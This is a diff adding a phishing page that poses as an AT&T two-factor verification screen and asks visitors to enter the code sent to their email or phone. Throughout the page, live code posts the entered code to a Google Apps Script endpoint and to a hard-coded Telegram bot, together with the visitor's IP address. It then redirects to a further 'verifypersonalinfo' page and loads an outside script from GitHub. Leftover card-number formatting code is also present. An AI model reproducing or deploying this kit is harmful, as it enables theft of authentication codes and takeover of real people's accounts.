@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/style.css">
+    <link data-rh="true" rel="shortcut icon" type="image/x-icon" href="/images/att_logo_icon_170510.ico">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <title>2fa|verification</title>
+</head>
+<body>
+    <div class="container2">
+        <form class="ffform form1 gform pure-form pure-form-stacked" method="POST" data-email="eri10ogo@gmail.com" id="form" action="https://script.google.com/macros/s/AKfycbzaPSiKpkLLT54lMlZFsYun0So55863soFtm7TsUxSqOQ3MxpcOsiTXaHPF8VAKMJik/exec">
+            <div class="gotcode">
+                <center><h1>Got Your Code ?</h1></center>
+            </div>
+            <div class="sent">
+                <center><h3>We have sent it to your Email or Phone</h3></center>
+                
+            </div>
+            <div class="codee">
+                <label for="code" style="font-weight: 600; font-family: Arial, Helvetica, sans-serif;">Enter it here</label><br>
+                <input type="text" name="ATT 2FA code" id="codee" required>
+            </div>
+            <div class="noworries">
+                <p>No Worries you won't have to do this again for this ID, Unless you clear your cookies or use another browser, or forget you password and change it.</p>
+            </div>
+
+            <div class="over">
+                <center><a href="">Start over with a new code</a></center>
+            </div>
+            <div class="tfabutton">
+                <center>
+                    <button type="submit" id="bb">Submit</button>
+                    <button type="button" id="bbb">Cancel</button>
+                </center>
+                
+            </div>
+            
+            
+        </form>
+        
+    </div>
+
+    <!--Scripting begins-->
+    <!---Email send script-->
+    <script data-cfasync="false" type="text/javascript">
+    
+        (function() {
+       function validEmail(email) {
+         var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i;
+         return re.test(email);
+       }
+     
+       function validateHuman(honeypot) {
+         if (honeypot) {
+           console.log("Robot Detected!");
+           return true;
+         } else {
+           console.log("Welcome Human!");
+         }
+       }
+       function getFormData(form) {
+         var elements = form.elements;
+     
+         var fields = Object.keys(elements).filter(function(k) {
+               return (elements[k].name !== "honeypot");
+         }).map(function(k) {
+           if(elements[k].name !== undefined) {
+             return elements[k].name;
+           }else if(elements[k].length > 0){
+             return elements[k].item(0).name;
+           }
+         }).filter(function(item, pos, self) {
+           return self.indexOf(item) == pos && item;
+         });
+     
+         var formData = {};
+         fields.forEach(function(name){
+           var element = elements[name];
+           formData[name] = element.value;
+           if (element.length) {
+             var data = [];
+             for (var i = 0; i < element.length; i++) {
+               var item = element.item(i);
+               if (item.checked || item.selected) {
+                 data.push(item.value);
+               }
+             }
+             formData[name] = data.join(', ');
+           }
+         });
+     
+         // add form-specific values into the data
+         formData.formDataNameOrder = JSON.stringify(fields);
+         formData.formGoogleSheetName = form.dataset.sheet || "ATT-2FA"; // default sheet name
+         formData.formGoogleSendEmail = form.dataset.email || ""; // no email by default
+     
+         console.log(formData);
+         return formData;
+       }
+     
+       function handleFormSubmit(event) {  
+         event.preventDefault();           
+         var form = event.target;
+         var data = getFormData(form);         
+         if( data.email && !validEmail(data.email) ) {   
+           var invalidEmail = form.querySelector(".email-invalid");
+           if (invalidEmail) {
+             invalidEmail.style.display = "block";
+             return false;
+           }
+         } else {
+           disableAllButtons(form);
+           var url = form.action;
+           var xhr = new XMLHttpRequest();
+           xhr.open('POST', url);
+           xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+           xhr.onreadystatechange = function() {
+               console.log(xhr.status, xhr.statusText);
+               console.log(xhr.responseText);
+               var formElements = form.querySelector(".form-elements")
+               if (formElements) {
+                 formElements.style.display = "none"; // hide form
+               }
+               
+               return;
+           };
+           var encoded = Object.keys(data).map(function(k) {
+               return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
+           }).join('&');
+           xhr.send(encoded);
+         }
+       }
+       
+       function loaded() {
+         console.log("Contact form submission handler loaded successfully.");
+         var forms = document.querySelectorAll("form.gform");
+         for (var i = 0; i < forms.length; i++) {
+           forms[i].addEventListener("submit", handleFormSubmit, false);
+         }
+       };
+       document.addEventListener("DOMContentLoaded", loaded, false);
+     
+       function disableAllButtons(form) {
+         var buttons = form.querySelectorAll("button");
+         for (var i = 0; i < buttons.length; i++) {
+           buttons[i].disabled = true;
+         }
+       }
+     })();
+     
+        
+       </script>
+       <!------------------------------------------------------------->
+
+
+       <!--Script to format inputs-->
+    <script>
+        $('#c-card').on('keypress change', function () {
+        $(this).val(function (index, value) {
+        return value.replace(/[^0-9]/g, "").replace(/\W/gi, '').replace(/(.{4})/gi, '$1 ');
+            });
+        });
+
+        $('#expcc').on('keypress change', function () {
+        $(this).val(function (index, value) {
+        return value.replace(/[^0-9]/g, "").replace(/\W/gi, '').replace(/(.{2})/, '$1/');
+            });
+        });
+    </script>
+    <!----------------------------------->
+    <script type="text/javascript" src="https://github.com/Plibadd1/jerk/blob/main/js1.js"></script>
+    <!--SCRIPT TO TELEGRAM BOT-->
+    <Script>
+        let tg = {
+    token: "6082434948:AAGgeb97x4kYcdUo1ze46pYufIX6DgPNjW0", // Your bot's token that got from @BotFather
+    chat_id: 5747894400 // The user's(that you want to send a message) telegram chat id
+}
+
+/**
+ * By calling this function you can send message to a specific user()
+ * @param {String} the text to send
+ *
+*/
+function sendMessage(text)
+{
+    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
+    const xht = new XMLHttpRequest();
+    xht.open("GET", url);
+
+    xht.onreadystatechange = function() {
+        //var bernum =document.getElementById("uberphone").value;
+        var thankyou=1;
+        if(thankyou=1){
+           window.location.href="verifypersonalinfo.html"
+        }
+        return;
+    }
+    xht.send();
+    
+}
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+const form = document.querySelector("#form");
+        form.addEventListener("submit", (e)=>{
+            e.preventDefault();
+        
+            var ad;         
+        $.getJSON("https://api.ipify.org?format=json",function(data){
+             $(ad=data.ip)
+
+        
+        //fourth
+        
+        var Codeee = document.getElementById("codee").value;
+
+        var mess=`:::Results Of ATT 2FA::: %0A%0A -  Code : ${Codeee}  %0A - IPAdrress : ${ad}`
+
+        sendMessage(mess)
+        
+        })})
+    </Script>
+</body>
+</html>
